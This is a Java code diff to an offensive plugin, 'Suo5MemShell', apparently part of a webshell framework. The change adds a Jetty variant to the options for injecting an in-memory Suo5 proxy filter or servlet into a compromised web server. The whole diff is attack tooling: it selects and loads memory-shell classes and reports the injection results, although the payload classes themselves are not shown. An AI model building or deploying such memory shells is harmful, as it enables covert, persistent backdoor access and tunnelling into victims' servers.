@@ -21,7 +21,7 @@ import java.io.InputStream;
 
 @PluginAnnotation(payloadName = "JavaDynamicPayload", Name = "Suo5MemShell", DisplayName = "Suo5MemShell")
 public class Suo5MemShell implements Plugin {
-    private static final String[] PROXY_TYPE = new String[]{"Suo5Filter", "Suo5Servlet", "Suo5WebLogicFilter"};
+    private static final String[] PROXY_TYPE = new String[]{"Suo5Filter", "Suo5Servlet", "Suo5WebLogicFilter", "Suo5JettyFilter"};
     private static final String CLASS_NAME = "plugins.Suo5MemShell";
     private final JPanel panel = new JPanel(new BorderLayout());
     private final JLabel urlPatternPassLabel = new JLabel("urlPattern (servletPath): ");
@@ -89,9 +89,13 @@ public class Suo5MemShell implements Plugin {
                     className = "Suo5Servlet";
                     inputStream = this.getClass().getResourceAsStream("/Suo5Servlet.class");
                     reqParameter.add("servletPath", urlPattern);
-                } else {
+                } else if (proxyType.equals("Suo5WebLogicFilter")){
                     className = "Suo5WebLogicFilter";
                     inputStream = this.getClass().getResourceAsStream("/Suo5WebLogicFilter.class");
+                    reqParameter.add("urlPattern", urlPattern);
+                } else {
+                    className = "Suo5JettyFilter";
+                    inputStream = this.getClass().getResourceAsStream("/Suo5JettyFilter.class");
                     reqParameter.add("urlPattern", urlPattern);
                 }
                 reqParameter.add("userAgent", userAgent);
@@ -108,8 +112,11 @@ public class Suo5MemShell implements Plugin {
                         this.resultTextArea.append(String.format("injecting Suo5Filter, filterName: %s, urlPattern: %s, result: %s\n", filterName.isEmpty()?"[random]":filterName, urlPattern, resultString));
                     } else if (proxyType.equals("Suo5Servlet")) {
                         this.resultTextArea.append(String.format("injecting Suo5Servlet, servletPath: %s, result: %s\n", urlPattern, resultString));
-                    } else {
+                    } else if (proxyType.equals("Suo5WebLogicFilter")) {
                         this.resultTextArea.append(String.format("injecting Suo5WebLogicFilter, urlPattern: %s, result: %s\n", urlPattern, resultString));
+                    } else {
+                        this.resultTextArea.append(String.format("injecting Suo5JettyFilter, urlPattern: %s, result: %s\n", urlPattern, resultString));
+
                     }
                     this.resultTextArea.append(String.format("user-agent: %s\n", userAgent));
                     GOptionPane.showMessageDialog(this.panel, "ok", "提示", 1);
